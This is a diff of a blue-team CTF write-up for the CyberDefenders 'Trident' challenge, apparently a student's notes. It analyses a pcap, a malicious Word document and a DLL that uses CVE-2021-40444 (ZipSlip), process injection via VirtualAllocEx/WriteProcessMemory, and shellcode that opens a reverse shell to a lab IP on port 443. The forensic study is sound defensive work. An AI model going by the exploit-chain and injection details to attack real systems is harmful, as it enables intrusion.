@@ -6,79 +6,74 @@ slug: /3467b0eb-61a4-8079-bfee-de410bda8cbe
 
 
 
-Trong giới an toàn thông tin, khi nhắc đến **Trident**, chúng ta thực chất không nói về một mã độc (malware) độc lập, mà đang nói về một **chuỗi khai thác lỗ hổng (exploit chain)** cực kỳ tinh vi. Chuỗi này được thiết kế đặc biệt để xuyên thủng hệ điều hành iOS của Apple và cài đặt phần mềm gián điệp khét tiếng **Pegasus**.
+---
 
 
-Dưới đây là bức tranh chi tiết về Trident:
+[https://cyberdefenders.org/blueteam-ctf-challenges/trident/](https://cyberdefenders.org/blueteam-ctf-challenges/trident/)
 
 
-### 1. Nguồn gốc và Mục đích {#3467b0eb61a4802db69ed2973b854bdc}
-
-- **Kẻ đứng sau:** Trident và phần mềm Pegasus được tạo ra bởi **NSO Group**, một tập đoàn của Israel. Các công cụ này được bán với giá rất cao cho các chính phủ, nhưng thực tế đã bị lạm dụng để theo dõi các nhà báo, các nhà hoạt động nhân quyền, nhà ngoại giao và chính trị gia đối lập trên toàn cầu.
-- **Phát hiện:** Mối đe dọa này được đưa ra ánh sáng vào tháng 8 năm 2016 bởi nỗ lực nghiên cứu chung của Citizen Lab và công ty bảo mật Lookout.
-- **Sức mạnh:** Trident có khả năng "Jailbreak" (bẻ khóa) iPhone hoàn toàn ngầm mà nạn nhân không hề hay biết. Nó đã phá vỡ niềm tin rằng hệ sinh thái đóng và sandbox của Apple là bất khả xâm phạm.
-
-### 2. Phân tích Kỹ thuật (Chuỗi 3 lỗ hổng Zero-day) {#3467b0eb61a48036a7e0ce80780f7067}
+## Basic triage {#3597b0eb61a48034b499da910222b268}
 
 
-Trident được đặt tên như vậy (nghĩa là "Đinh ba") vì nó kết hợp sức mạnh của 3 lỗ hổng Zero-day (chưa từng được Apple biết đến trước đó). Quy trình tấn công diễn ra theo một kịch bản hoàn hảo như sau:
-
-1. **Khâu mồi nhử (Delivery):** Kẻ tấn công gửi một đường link độc hại đến mục tiêu thông qua SMS, iMessage, email hoặc mạng xã hội. Nạn nhân chỉ cần nhấp vào liên kết này để mở trang web.
-2. **Khâu xâm nhập (CVE-2016-4657):** Khai thác một lỗ hổng trong WebKit (công cụ kết xuất trang web của Safari), cho phép kẻ tấn công thực thi mã từ xa (RCE) ngay trong trình duyệt.
-3. **Khâu định vị Kernel (CVE-2016-4655):** Từ quyền truy cập bước đầu, mã độc tiếp tục khai thác một lỗi rò rỉ thông tin trong Kernel (nhân hệ điều hành) để xác định chính xác vị trí của Kernel trong bộ nhớ.
-4. **Khâu chiếm quyền hoàn toàn (CVE-2016-4656):** Sau khi xác định được tọa độ, bước cuối cùng là khai thác lỗ hổng hỏng bộ nhớ (Memory Corruption) trong Kernel để qua mặt các lớp bảo mật, cho phép tự động Jailbreak thiết bị.
-
-### 3. Hậu quả sau khi "Đinh ba" cắm xuống (Payload: Pegasus) {#3467b0eb61a480e39da4d7f18ef68ef5}
-
-
-Một khi chuỗi Trident chạy thành công, thiết bị sẽ bị cấy phần mềm gián điệp Pegasus và chính thức trở thành "gián điệp" trong túi của nạn nhân:
-
-- **Kiểm soát toàn diện:** Kẻ tấn công có thể bật micro để ghi âm cuộc gọi, truy cập camera lén lút, theo dõi vị trí GPS theo thời gian thực và thu thập mọi mật khẩu/thao tác gõ phím.
-- **Xuyên thủng mã hóa:** Điểm đáng sợ nhất là Pegasus lấy dữ liệu ở tầng hệ điều hành. Do đó, nó có thể trích xuất các cuộc trò chuyện từ WhatsApp, Telegram hay iMessage trước cả khi dữ liệu bị ứng dụng mã hóa gửi đi.
-- **Khả năng tự hủy:** Pegasus được trang bị một cơ chế tự hủy (self-destruct) rất nhạy. Nếu cảm thấy bị đe dọa hoặc có nguy cơ bị phát hiện, nó sẽ tự động gỡ bỏ chính nó cùng các cơ chế duy trì (persistence) để xóa sạch dấu vết pháp y.
-
-| 23.205.48.23    | 192.168.112.139 |   |
-| --------------- | --------------- | - |
-| 192.168.112.128 |                 |   |
-| 40.77.226.250   |                 |   |
-| 192.168.112.2   |                 |   |
-| 51.104.136.2    |                 |   |
-| 2.23.28.86      |                 |   |
+| 23.205.48.23 [e584.g.akamaiedge.net] [omextemplates.content.office.net.edgekey.net] [omextemplates.content.office.net] (Other)                                                     | 192.168.112.139 [WIN-D2TSDEME6NN] (Windows) |   |
+| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------- | - |
+| 192.168.112.128 - Linux                                                                                                                                                            |                                             |   |
+| 40.77.226.250 [v10-win.vortex.data.trafficmanager.net] [v10.vortex-win.data.microsoft.com] (Other)                                                                                 |                                             |   |
+| 192.168.112.2                                                                                                                                                                      |                                             |   |
+| 51.104.136.2 [settingsfd-geo.trafficmanager.net] [settings-win.data.microsoft.com] [settings-win.data.microsoft] (Other)                                                           |                                             |   |
+| 2.23.28.86 [e16253.d.akamaiedge.net] [templateservice.office.com.edgekey.net] [templateservice.office.com] [templateservice.cdn.office.c] [templateservice.cdn.office.com] (Other) |                                             |   |
 
 
-TeamCymruMalwareHashRegistry:
+Can’t deduce any useful insight here.
 
 
 ### Q1 The attacker conducted a port scan on the victim machine. How many open ports did the attacker find? {#3467b0eb61a4803d9144eb87bdc9c39c}
 
 
-ip.dst==192.168.112.128 && tcp.flags.syn==1 && tcp.flags.ack==1
-Vào menu **Statistics** -&gt; **Endpoints** -&gt; Chuyển sang tab **TCP** -&gt; Đánh dấu tick vào ô _"Limit to display filter"_ ở góc dưới.
+To check if hacker send a tcp syn and the host answer with SYN, ACK (the port is opened)
 
+
+`ip.dst==192.168.112.128 && tcp.flags.syn==1 && tcp.flags.ack==1`
+**Statistics** -&gt; **Endpoints** -&gt; Chuyển sang tab **TCP** -&gt;_Limit to display filter"_ 
 
 
 ![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3467b0eb-61a4-801f-a32c-c766bf428bf2.png)
 
 
-Hoặc dùng network miner: Open TCP Ports: 587 (Smtp) 135 139 (NetBiosSessionService) 143 (Imap) 25 (Smtp) 445 (NetBiosSessionService) 110 (Pop3)
+using network miner: Open TCP Ports: 587 (Smtp) 135 139 (NetBiosSessionService) 143 (Imap) 25 (Smtp) 445 (NetBiosSessionService) 110 (Pop3)
 
 
-2686	2686	192.168.112.128 (Linux)	192.168.112.139 [WIN-D2TSDEME6NN] (Windows)	"[support@cyberdefenders.org](mailto:support@cyberdefenders.org)" [support@cyberdefenders.org](mailto:support@cyberdefenders.org)	"joshua@cyberdefenders.org" [joshua@cyberdefenders.org](mailto:joshua@cyberdefenders.org)	Immediate respones	Smtp	2021-10-01 12:31:54 UTC	19077
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-808c-a31a-ec514f8638b1.png)
 
 
 ### Q2 What is the victim's email address? {#3467b0eb61a480d8bb1bc14b66069ce7}
 
 
-[joshua@cyberdefenders.org](mailto:joshua@cyberdefenders.org)
+use smtp as filter and find the packet with “From:”
+
+
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-8088-92a0-d6ed2fc50d30.png)
+
+
+joshua@cyberdefenders.org
 
 
 ### Q3 The malicious document file contains a URL to a malicious HTML file. Provide the URL for this file. {#3467b0eb61a480bcabbee94cf022e04c}
 
 
-grep -r -F ".html" "web server"/
+i find the filename: web server.docx in network miner
 
 
-[http://192.168.112.128/word.html](http://192.168.112.128/word.html)
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-8053-a529-e6e01e5d0972.png)
+
+
+extract it and use this command: `grep -r -F ".html"` to find in the folder
+
+
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-80ec-8aaa-c5a61dd456cb.png)
+
+
+http://192.168.112.128/word.html
 
 
 ### Q4 What is the Microsoft Office version installed on the victim machine? {#3467b0eb61a480249a27da8f6e9f47f1}
@@ -90,113 +85,220 @@ http.request.uri contains "/word.html”
 ![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3467b0eb-61a4-8031-821c-c8ef397f514a.png)
 
 
+15.0.4517
+
+
 ### Q5 The malicious HTML contains a js code that points to a malicious CAB file. Provide the URL to the CAB file? {#3467b0eb61a4800d955dca9ca832996b}
 
 
-Ta grep file word.html
+ grep -F “.cab” word.html
 
 
-[http://192.168.112.128/word.cab](http://192.168.112.128/word.cab)
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-80ef-8124-cdd1f938d73b.png)
+
+
+http://192.168.112.128/word.cab
 
 
 ### Q6 The exploit takes advantage of a CAB vulnerability. Provide the vulnerability name? {#3467b0eb61a480f79a3dcfad7e70dbdc}
 
 
-**CAB** (viết tắt của **Cabinet**) là định dạng tệp lưu trữ và nén dữ liệu gốc của hệ điều hành Microsoft Windows (khá giống với `.zip` hay `.rar`). Có nhiều vulnerabilities bị lợi dụng
+Extract the [word.cab](http://word.cab/) and calculate the hash
 
 
-A. Rửa sạch dấu vết "Mark of the Web" (MotW): windows defender sẽ cảnh báo trường hợp tải từ web, tuy nhiên với file cab đôi khi không bị cảnh báo
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-807a-bb87-ed2b2aff84df.png)
 
 
-B. Lợi dụng các công cụ hợp pháp của Windows (LOLBins)
-
-- **Khai thác:** Chúng sử dụng các công cụ dòng lệnh có sẵn và hợp pháp như `extrac32.exe`, `expand.exe`, hoặc `wusa.exe` (Windows Update Standalone Installer) để âm thầm giải nén file mã độc từ file `.cab` vào các thư mục hệ thống. Do `wusa.exe` là file chuẩn của Microsoft, các hệ thống giám sát (EDR) thường bỏ qua hành vi này.
-
-C. Lỗ hổng Path Traversal (Trượt thư mục)
+When lookup in virustotal, i notice that it related CVE-2021-40444
 
 
-D. Chuỗi khai thác MSHTML / Internet Explorer (Ví dụ thực tế)
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-8016-ad99-caee33f14d7e.png)
 
 
-Ngay cả trong năm 2024, file CAB vẫn là tâm điểm của các lỗ hổng Zero-day. Gần đây nhất là lỗ hổng **CVE-2024-38112** (bị khai thác bởi nhóm hacker Void Banshee):
+find a github page with the vulnerability name:
 
-- Kẻ tấn công lừa nạn nhân tải một file `.url` (Internet Shortcut) giả mạo.
-- Khi bấm vào, file `.url` này gọi engine MSHTML cũ kỹ (lõi của Internet Explorer) vốn vẫn còn ẩn bên trong Windows 10/11.
-- MSHTML sau đó tự động tải và thực thi một file `.cab` chứa mã độc mà không cần nạn nhân đồng ý, từ đó lây nhiễm phần mềm tống tiền hoặc Trojan.
 
-Kết quả: `zipslip`
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-8016-b602-e2897e3cd469.png)
+
+
+`zipslip`
 
 
 ### Q7 Analyzing the dll file what is the API used to write the shellcode in the process memory? {#3467b0eb61a48099b1e5e1c6b822cfac}
 
 
-![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3467b0eb-61a4-8059-b766-edb6806115c6.png)
+Extract the [word.cab](http://word.cab/) using 7z x word.cab result msword.inf file - which is in fact a dll file
 
 
-`WriteProcessMemory` là API kinh điển chuyên dùng để tiêm (inject) shellcode hoặc mã độc thẳng vào bộ nhớ của một tiến trình hợp lệ (giúp nó trốn tránh sự phát hiện của phần mềm diệt virus).
+```powershell
+80$ file msword.inf 
+msword.inf: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+
+```
+
+
+Then i use objdump to extract 
+
+
+```powershell
+objdump -p msword.inf | grep -A 50 "Import Table"
+```
+
+
+`-p:`   dump out all the details of the PE Header: Section Table, Export Table, and the Import Table.
 
 
 
-![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3467b0eb-61a4-80d4-a1c0-eadafd932183.png)
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-80ff-b1b4-f50681968440.png)
+
+
+> `WriteProcessMemory` is windows API which alloww attacker to inject shellcode into a process. 
+
+
+:::tip
+
+objdump is a powerful command-line utility used to display information about compiled binary files (object files, libraries, executables)
+- it can read the header of a file (PE header in windows or ELF in Linux) and translate into human-readable text
+
+Meaning of the import table: all the import functions (which have specific capability) are stored in system files like `kernel32.dll`, `user32.dll`, or `ws2_32.dll` . Every programs has to use these funtions, even attacker’s one.
+
+- If you see imports from `ws2_32.dll` (like `socket`, `connect`, `send`), the file is capable of network communication (potential beaconing or downloading).
+
+- If you see `Advapi32.dll` importing `RegCreateKey` or `RegSetValueEx`, the file modifies the Windows Registry (likely for persistence).
+
+- If you see `kernel32.dll` importing `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`, the file is highly likely attempting **Process Injection** (similar to the Defense Evasion tactics we discussed earlier).
+
+:::
+
+
 
 
 ### Q8 Extracting the shellcode from the dll file. What is the name of the library loaded by the shellcode? {#3467b0eb61a480849eb0d168ab2d6feb}
 
 
-Trong IDA, bạn bấm đúp vào hàm `WriteProcessMemory` để xem nó ghi dữ liệu từ đâu vào RAM. Hàm này có cấu trúc `WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, ...)`.
-
-- Tham số `lpBuffer` chính là địa chỉ của Shellcode.
-- Đi tới địa chỉ đó trong IDA, quét khối toàn bộ đống dữ liệu (Hex) đó và xuất ra một file nhị phân (ví dụ lưu tên là `shellcode.bin` ra Desktop).
-- 
-
-BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
-.idata:1000202C                 extrn WriteProcessMemory:dword
-.idata:1000202C                                         ; CODE XREF: sub_10001050+9E↑p
-.idata:1000202C                                         ; DATA XREF: sub_10001050+9E↑r
-
-Hàm `WriteProcessMemory` đang bị gọi ra để sử dụng ở bên trong hàm `sub_10001050` (tại dòng lệnh cách điểm bắt đầu 9E byte)
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3467b0eb-61a4-80d4-a1c0-eadafd932183.png)
 
 
-
-![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3467b0eb-61a4-80e4-87ed-c0d9d3f69997.png)
-
-
-push    offset unk_10003000 ; lpBuffer
+Navigate to the imports lists, which is explained in Q7 `WriteProcessMemory` to check where it write to the RAM. 
 
 
-_"Hãy lấy 0x1000 byte dữ liệu bắt đầu từ vị trí 10003000 và bơm thẳng vào RAM của tiến trình rundll32.exe"_.
-Sau đó shift+E
+	`WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, ...)`.
 
 
-![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3467b0eb-61a4-8009-b575-e20064ad12bf.png)
+	![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-8002-b4b6-e140a68f0426.png)
 
 
-Sau đó dùng dd để tách malware
+	`VirtualAllocEx` allocates memory inside a _remote_ process. The `hProcess` parameter being pushed to the stack tells Windows, "Allocate memory inside the `rundll32.exe` process I just created.
+
+
+	```text
+	.text:100010BF push 40h  ; (flProtect = PAGE_EXECUTE_READWRITE)
+	.text:100010C1 push 1000h ; flAllocationType)
+	.text:100010C6 push 1000h ;  (dwSize)
+	.text:100010CB push 0     ; (lpAddress)
+	.text:100010D0 push edx   ;  (hProcess)
+	.text:100010D1 call ds:VirtualAllocEx ; call the function
+	```
+
+
+	`0x40` (`PAGE_EXECUTE_READWRITE`): is suscpicious
+
+
+	Next the malware call WriteProcessMemory: 
+
+
+	```powershell
+	push 1000h               ; nSize (Size of the payload)
+	push offset unk_10003000 ; lpBuffer
+	```
+
+
+	`0x10003000` is where the shellcode start
+
+
+	![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-8033-abb4-f123176414f4.png)
+
+
+	
+Switch to hex view: `FC E8 8F 00 00 00` is the signature of shellcode created by Metasploit or Cobalt strike framework
+
+
+	![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-8013-b6e6-de66b74a45db.png)
+
+
+	We can also see that there is a user-agent named: mozilla,…. that means perhaps the malware will connect to external ip when executed
+
+
+Employ dd to extract the shellcode
 
 
 ```c++
 dd if=msword.inf of=shellcode.bin bs=1 skip=3072 count=4096
 ```
 
-- **`dd`**: Tên lệnh (Data Duplicator), chuyên dùng để sao chép, cắt ghép và chuyển đổi dữ liệu ở tầng thấp nhất (Raw data).
-- **`if=msword.inf`** _(Input File)_: Chỉ định file đầu vào chứa dữ liệu gốc cần cắt (chính là file DLL chứa mã độc của bạn).
-- **`of=shellcode.bin`** _(Output File)_: Chỉ định file đầu ra. Kết quả sau khi cắt sẽ được đổ vào file này.
-- **`bs=1`** _(Block Size)_: Cài đặt kích thước của một khối dữ liệu là **1 byte**. Điều này nói với `dd` rằng: _"Hãy đếm và cắt chính xác từng byte một nhé"_. Nếu không có tham số này, mặc định `dd` sẽ cắt theo khối lớn (ví dụ 512 byte), làm sai lệch kích thước Shellcode.
-- **`skip=3072`**: Yêu cầu `dd` **bỏ qua 3072 byte đầu tiên** của file gốc rồi mới bắt đầu copy.
-	- _Tại sao lại là 3072?_ Con số 3072 trong hệ thập phân chính là **`0xC00`** trong hệ thập lục phân (Hex). Địa chỉ `10003000` mà bạn thấy trong IDA là địa chỉ ảo khi file được nạp lên RAM (Virtual Address). Còn khi file đang nằm im trên ổ cứng, vị trí vật lý (File Offset) của đoạn Shellcode đó chính xác nằm ở byte thứ `0xC00` (tức 3072). Lệnh này giúp "nhảy" đúng đến vị trí bắt đầu của Shellcode.
-- **`count=4096`**: Yêu cầu `dd` chỉ **copy đúng 4096 khối** (tương đương 4096 byte vì `bs=1`) rồi dừng lại ngay lập tức.
-	- _Tại sao lại là 4096?_ Bạn có nhớ tham số `push 1000h` (Kích thước `nSize`) trong IDA mà chúng ta phân tích không? **`1000h`** (Hex) đổi ra thập phân chính là **4096**!
+- **`bs=1`** blocksize - cut every byte, not by chunk
+- **`skip=3072`**: shellcode starts at C00 = 3072
+- **`count=4096`**: `push` **`1000h`**  in `VirtualAllocEx` function → 4096 (decimal) blocks
+
+:::tip
+
+push in `WriteProcessMemory` has to be smaller than in `VirtualAllocEx.` Of course because you can’t build a house that is bigger than your land
+
+:::
+
+
+
+
+Then we use scdbg to analyze the shellcode
+
+
+![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3597b0eb-61a4-800a-8338-f8454e17c060.png)
+
+
+> wininet
+
 
 ### Q9 Which port was configured to receive the reverse shell? {#3467b0eb61a480fda4cdf525e7c14393}
 
 
-![](./3467b0eb-61a4-8079-bfee-de410bda8cbe.3467b0eb-61a4-804e-ac95-d079f860e0ef.png)
+I`nternetConnectA(server: 192.168.112.128, port: 443, )`
 
 
-# Tổng kết {#3467b0eb61a4805ab65be4cda65b8f14}
+## Exploitation Chain for CVE-2021-40444 {#3597b0eb61a4807b989bcdf372233ecd}
 
 
-### Câu lệnh {#3467b0eb61a480749a76e705c67031ca}
+Phase 1: Delivery & Trigger
+
+- Step 1: Victim Interaction. The victim receives and opens a malicious Word document (e.g., `web server.docx`).
+- Step 2: External OLE Relationship. Embedded within the document's structure (specifically inside `document.xml.rels`) is a malicious External OLE Relationship. This link points to a remote HTML file hosted on the attacker's infrastructure (e.g., `http://192.168.112.128/word.html`).
+
+Phase 2: Payload Download
+
+- Step 3: IE Engine Invocation. By default, Microsoft Word attempts to render a preview of the OLE object. To accomplish this, it silently spawns the Internet Explorer (IE) rendering engine (`ieframe.dll`) in the background.
+- Step 4: JScript Execution. The background browser loads and executes the remote `word.html`, which contains malicious JScript. This script performs two key actions: it downloads a crafted `.cab` file (`word.cab`), and it dynamically generates an `iframe` pointing to an `.inf` file using the special `.cpl:` (Control Panel) URI scheme.
+
+Phase 3: Exploitation (ZipSlip / Path Traversal)
+
+- Step 5: CAB Processing. The `.cab` file is processed by the system. Normally, Windows would safely extract the contents of this archive into a restricted sandbox directory (`%TEMP%\Low`).
+- Step 6: Triggering the Vulnerability. This is the core of CVE-2021-40444. The crafted `.cab` file exploits a Directory Traversal (ZipSlip) vulnerability. This allows the extraction process to "escape" the restricted `Low` folder and drop the payload—an `.inf` file that is actually a malicious DLL (e.g., `msword.inf`)—directly into the parent `%TEMP%` directory, bypassing the sandbox restrictions.
+
+Phase 4: Execution & Process Injection
+
+- Step 7: Control Panel Side-loading. The JScript from Step 4 invokes the newly dropped `.inf` file via the `.cpl:` directive. This tricks the Windows OS into using the legitimate `rundll32.exe` process to load and execute the malicious `.inf` (DLL) file as if it were a Control Panel item.
+- Step 8: Process Injection. Once the malicious DLL is loaded into `rundll32.exe`, it initiates the injection sequence you analyzed in IDA Pro:
+	- It calls `VirtualAllocEx` to allocate a block of memory with Read/Write/Execute (RWX - `0x40`) permissions inside the `rundll32.exe` process.
+	- It calls `WriteProcessMemory` to copy the embedded shellcode (from offset `0x10003000`) into this newly allocated memory space.
+	- It calls `SetThreadContext` to hijack the execution flow (changing the EIP register) and `ResumeThread` to force the process to run the injected shellcode.
+- Result: The shellcode executes successfully and calls `InternetConnectA` to reach out to the attacker's IP (`192.168.112.128`) over port `443`, establishing a Reverse Shell and granting the attacker full control over the victim's machine.
+
+## Some usefull knowledge {#3467b0eb61a4805ab65be4cda65b8f14}
+
+
+### **1. Using** **`dd`** **for Shellcode Extraction: Virtual Address (VA) vs. Raw Offset** {#3597b0eb61a4804caa04cc3b8e31b6a5}
+
+
+When extracting shellcode from a PE file using `dd`, we cannot use the memory address shown in IDA Pro (e.g., `0x10003000`). This is a Virtual Address (VA), which is where Windows maps the data in RAM when the program runs.
+To extract it directly from the file on disk, we need the Raw File Offset. By inspecting the PE Section Headers, we can see that the `.data` section (which contains our shellcode) maps to the physical offset `0xC00` in the hex editor. Since `0xC00` in Hex equals `3072` in Decimal, we instruct `dd` to skip the first 3072 bytes of the file to hit the exact starting point of our payload:
 
 
 ```c++
@@ -204,5 +306,22 @@ dd if=msword.inf of=shellcode.bin bs=1 skip=3072 count=4096
 ```
 
 
-`grep -r -F ".html" "web server"/`
+### **2.** **`scdbg`**  {#3597b0eb61a4806d9430f1562c524c48}
 
+
+Analyzing raw shellcode statically is extremely difficult. `scdbg` is an emulation tool built specifically for this. It creates a fake Windows environment (a virtual CPU and memory space) and hooks common Windows APIs.
+
+
+ When we feed `shellcode.bin` into `scdbg`, it runs the malicious code safely. Whenever the shellcode tries to call a Windows function (like `LoadLibraryA` or `InternetConnectA` to establish a reverse shell), `scdbg` intercepts it and prints the parameters to the screen. This allows analysts to quickly discover C2 IPs, ports, and downloaded file names without needing a full sandbox setup.
+
+
+### **3. The CVE-2021-40444 Exploit Mechanism** {#3597b0eb61a48062a448d6165adb1d48}
+
+- The attack chain bypasses multiple layers of Windows security.
+- First, the Malicious Document uses an external OLE relationship to download a crafted `.cab` file. The vulnerability (ZipSlip / Path Traversal) allows the attacker to extract an `.inf` file (which is actually a malicious DLL) outside of the normal Temp directory.
+- Finally, the attacker uses an iframe with the `.cpl:` (Control Panel) URI scheme. This forces Windows `rundll32.exe` to execute the `.inf` file as a Control Panel item, triggering the malware execution entirely fileless-ly from the user's perspective.
+
+### **4.** **`grep`** **command flags:** {#3597b0eb61a480deab84f33209fe141a}
+
+- `r` (recursive): Read all files under each directory.
+- `F` (fixed strings): Interpret the pattern as a fixed, literal string (e.g., `.html`), rather than a regular expression. This prevents special characters like dots (`.`) from acting as regex wildcards.
